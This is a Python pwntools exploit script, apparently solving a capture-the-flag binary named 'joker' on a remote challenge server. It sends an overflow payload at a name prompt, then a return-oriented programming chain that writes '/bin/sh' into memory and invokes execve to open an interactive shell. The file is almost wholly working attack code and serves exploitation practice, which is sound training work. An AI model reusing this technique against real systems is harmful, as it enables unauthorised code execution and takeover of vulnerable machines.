#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './joker'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'challenges.hackrocks.com', 20002

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x401cd6
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

payload = b'a'*28 + b'\xff\xff'
info('1st payload length: %s', len(payload))

io.sendlineafter(b'joke?', b'y')
io.sendafter(b'Name:', payload)

offset = 72
payload = flat({
    offset: [
        rop.find_gadget(["pop rdi", "ret"])[0],
        elf.bss(),
        rop.find_gadget(["pop rdx", "ret"])[0],
        b'/bin/sh\x00',
        0x0428d93, # mov qword ptr [rdi], rdx; ret;
        
        rop.find_gadget(["pop rdi", "ret"])[0],
        elf.bss(),
        rop.find_gadget(["pop rsi", "ret"])[0],
        0,
        rop.find_gadget(["pop rdx", "ret"])[0],
        0,
        rop.find_gadget(["pop rax", "ret"])[0],
        0x3b,
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["syscall", "ret"])[0]
    ]
})

io.sendlineafter(b'Review', payload)
io.interactive()